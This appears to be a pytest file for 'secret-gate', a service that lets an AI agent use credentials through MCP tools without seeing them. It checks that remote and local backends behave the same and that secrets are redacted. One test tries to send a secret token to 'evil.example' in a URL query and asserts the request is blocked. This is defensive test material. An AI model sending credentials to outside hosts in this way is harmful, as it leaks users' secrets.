"""`secret-gate mcp` as a forwarder to the gate service (gate-service-v0 §4): same tools, calls go to mcp.*."""

from __future__ import annotations

import asyncio
import json
import subprocess

import httpx
import pytest
from mcp.server.fastmcp.exceptions import ToolError

from secret_gate.constants import KIND_TOTP, USE_EXEC, USE_HTTP, USE_OTP
from secret_gate.keystore import load_public_key
from secret_gate.mcp_backend import LocalMcpBackend, RemoteMcpBackend, default_backend
from secret_gate.mcp_server import build_server
from secret_gate.policy import SecretPayload
from secret_gate.tokens import make_token
from tests.fixtures import fake_secrets as fs
from tests.service_fixtures import running_service

SCOPE = "mcp-scope-0123456789abcdefghij"
BRIDGE = {"SECRET_GATE_REPAIR_URL": "http://127.0.0.1:4799/credential-repair", "SECRET_GATE_REPAIR_KEY": "k" * 24}


def _token(home, **kw) -> str:
    fields = {"value": fs.PORTAL.password, "hosts": list(fs.PORTAL.hosts), "uses": {USE_HTTP}, "label": "portal-a/pass", **kw}
    return make_token(load_public_key(home), SecretPayload.create(**fields))


def _tool_text(result) -> str:
    blocks = result[0] if isinstance(result, tuple) else result          # (content, structured) for str results
    return "\n".join(block.text for block in blocks)


def test_tool_definitions_are_identical_with_and_without_the_service(gate_home):
    async def definitions(backend):
        return [tool.model_dump() for tool in await build_server(backend).list_tools()]

    with running_service() as svc:
        local = asyncio.run(definitions(LocalMcpBackend.from_home(gate_home, None)))
        remote = asyncio.run(definitions(RemoteMcpBackend(svc.client, None, env={})))
    assert local == remote
    assert {t["name"] for t in local} == {"secret_describe", "secret_repair", "secret_otp", "secret_http", "secret_exec"}


def test_every_tool_is_forwarded_with_this_executions_scope():
    seen: list[httpx.Request] = []

    def site(request: httpx.Request) -> httpx.Response:
        seen.append(request)
        return httpx.Response(200, text="welcome " + request.headers["authorization"])

    def runner(argv, **_kw):
        return subprocess.CompletedProcess(argv, 0, stdout="echo " + argv[-1], stderr="")

    def bridge(request: httpx.Request) -> httpx.Response:
        body = json.loads(request.content)
        return httpx.Response(200, json={"ok": True, "token": body["token"], "label": "portal-a/totp", "kind": "secret",
                                         "hosts": [body["host"]], "uses": ["fill", "http"]})

    client = httpx.Client(transport=httpx.MockTransport(site))
    with running_service(http_client=lambda: client, exec_runner=runner,
                         repair_transport=httpx.MockTransport(bridge)) as svc:
        (svc.home / "exec_templates.json").write_text(json.dumps({"echo": {"argv": ["/bin/echo", "{SECRET}"]}}))
        token = _token(svc.home, uses={USE_HTTP, USE_EXEC})
        totp = _token(svc.home, value=fs.TOTP_SECRET_B32, uses={USE_OTP}, kind=KIND_TOTP, label="portal-a/totp")
        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})["refs"][0]["ref"]
        server = build_server(RemoteMcpBackend(svc.client, SCOPE, env=BRIDGE))

        async def scenario() -> dict[str, str]:
            return {
                "describe": _tool_text(await server.call_tool("secret_describe", {"token": ref})),
                "http": _tool_text(await server.call_tool("secret_http", {"method": "GET", "url": "https://portal-a.example.com/",
                                                                           "headers": {"Authorization": f"Bearer {ref}"}})),
                "exec": _tool_text(await server.call_tool("secret_exec", {"template": "echo", "token": ref})),
                "otp": _tool_text(await server.call_tool("secret_otp", {"token": totp})),
                "repair": _tool_text(await server.call_tool("secret_repair", {"token": totp, "host": "portal-a.example.com"})),
            }

        out = asyncio.run(scenario())
        assert json.loads(out["describe"])["ref"] == ref
        assert seen[0].headers["authorization"] == f"Bearer {fs.PORTAL.password}"
        assert json.loads(out["http"])["body"] == "welcome Bearer [REDACTED:portal-a/pass]"
        assert json.loads(out["exec"])["stdout"] == "echo [REDACTED:portal-a/pass]"
        assert out["otp"].isdigit() and len(out["otp"]) == 6
        assert json.loads(out["repair"])["uses"] == ["fill", "http"]
        everything = json.dumps(out)
        assert fs.PORTAL.password not in everything and fs.TOTP_SECRET_B32 not in everything


def test_service_errors_reach_the_model_as_the_same_tool_errors():
    with running_service() as svc:
        token = _token(svc.home)
        ref = svc.client.call("refs.register", {"scope": SCOPE, "tokens": [token]})["refs"][0]["ref"]
        unscoped = build_server(RemoteMcpBackend(svc.client, None, env={}))

        async def call(name: str, args: dict) -> str:
            with pytest.raises(ToolError) as exc:
                await unscoped.call_tool(name, args)
            return str(exc.value)

        assert "secret-gate: enc:ref: references only work inside the task" in asyncio.run(call("secret_describe", {"token": ref}))
        assert "secret-gate: credential repair is unavailable outside an active dispatcher task" in asyncio.run(
            call("secret_repair", {"token": token, "host": "portal-a.example.com"}))
        assert "not allowed on host" in asyncio.run(call("secret_http", {"method": "GET", "url": f"https://evil.example/?t={token}"}))


def test_default_backend_follows_the_socket(gate_home, monkeypatch):
    # The process environment, which no_real_gate_service points away from the machine's real socket.
    assert isinstance(default_backend(), LocalMcpBackend)
    with running_service() as svc:
        monkeypatch.setattr("secret_gate.mcp_backend.client_socket", lambda env: svc.socket)
        backend = default_backend({"SECRET_GATE_SCOPE": SCOPE})
        assert isinstance(backend, RemoteMcpBackend)
        assert backend.describe(_token(svc.home))["label"] == "portal-a/pass"
